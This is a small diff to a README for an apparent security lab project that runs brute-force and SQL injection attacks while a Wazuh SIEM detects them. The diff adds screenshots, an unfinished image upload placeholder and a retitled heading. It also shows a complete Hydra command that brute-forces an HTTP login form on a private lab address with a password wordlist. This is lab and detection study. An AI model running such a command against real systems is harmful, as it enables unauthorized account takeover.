@@ -1,3 +1,4 @@
+<img width="1007" height="592" alt="Captura de pantalla_2026-07-21_11-07-22" src="https://github.com/user-attachments/assets/0c731d44-dc90-4c78-8bae-c092ed3309f2" />
 
 ## Orchestrated Attack Framework: Multi-Stage Brute Force & SQLi with Real-Time SIEM Detection (Wazuh)
 
@@ -76,9 +77,10 @@ En /redlab-attacks se encuentran los tres pilares de la automatización: orchest
 
 <img width="1020" height="710" alt="fuezabruta" src="https://github.com/user-attachments/assets/e7e93869-3fc5-4ff0-a6ae-d6a70b311bde" />
 
+![Uploading Captura de pantalla_2026-07-21_11-07-22.png…]()
 
 
-## Comando Hydra - 
+## Hydra Code- 
 
 hydra -l admin -P midiccionary.txt -s 3000 192.168.3.10 http-post-form "/api/login:username=USER&password=PASS:i:F=Usuario o contraseña inválido"
 
